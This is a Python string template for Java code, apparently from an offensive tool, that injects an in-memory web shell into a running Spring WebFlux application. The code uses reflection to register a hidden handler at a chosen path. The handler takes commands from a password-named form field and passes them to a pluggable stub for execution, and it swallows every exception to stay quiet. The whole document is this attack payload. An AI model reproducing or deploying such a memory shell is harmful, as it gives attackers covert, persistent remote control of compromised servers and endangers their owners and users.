code = """
import org.springframework.web.server.ServerWebExchange;

import java.lang.reflect.*;
import java.util.*;
import java.util.function.Function;

public class SpringHandler {{
    private static String password = "{password}";
{common}
{decoder}
{stub}
    public synchronized <T> T hook(ServerWebExchange request)
            throws Exception {{
        Class ServerWebExchange = Class.forName(
            "org.springframework.web.server.ServerWebExchange"
        );
        Object mono = getMethodX(
            ServerWebExchange, "getFormData", 0
        ).invoke(request);

        Class Mono = Class.forName("reactor.core.publisher.Mono");
        Method flatMap = getMethodX(Mono, "flatMap", 1);
        Function transformer = reqbody -> {{
            Object resbody = null;
            try {{
                Class MultiValueMap = Class.forName(
                    "org.springframework.util.MultiValueMap"
                );
                String payload = (String) getMethodX(
                    MultiValueMap, "getFirst", 1
                ).invoke(reqbody, password);
                String result = stub(payload, null, null);
                if (result == null) {{result = "";}}
                resbody = getMethodX(Mono, "just", 1).invoke(Mono, result);
            }} catch (Exception e) {{}}
            return resbody;
        }};

        Object resbody = flatMap.invoke(mono, transformer);
        Class HttpStatus = Class.forName(
            "org.springframework.http.HttpStatus"
        );
        Class ResponseEntity = Class.forName(
            "org.springframework.http.ResponseEntity"
        );
        Object OK = getFieldValue(HttpStatus, "OK");
        Constructor responseEntity = ResponseEntity.getConstructor(
            Object.class, HttpStatus
        );
        return (T) responseEntity.newInstance(resbody, OK);
    }}

    public SpringHandler() {{}}

    public SpringHandler(
        Object requestMappingHandlerMapping, String path
    ) throws Exception {{
        Class requestMappingInfo = Class.forName(
            "org.springframework.web.reactive.result.method.RequestMappingInfo"
        );
        Method mPaths = requestMappingInfo.getMethod("paths", String[].class);
        Method registerHandlerMethod = getMethodX(
            requestMappingHandlerMapping.getClass(),
            "registerHandlerMethod", 3
        );
        registerHandlerMethod.setAccessible(true);
        registerHandlerMethod.invoke(
            requestMappingHandlerMapping, new SpringHandler(),
            getMethodX(SpringHandler.class, "hook", 1),
            invokeMethod(mPaths.invoke(null, new Object[]{{new String[]{{path}}}}),
        "build")
        );
    }}

    public static String addHandler(
        Object requestMappingHandlerMapping, String path
    ) {{
        try {{
            new SpringHandler(requestMappingHandlerMapping, path);
        }} catch (Exception e) {{}}
        return "addHandler";
    }}
}}
"""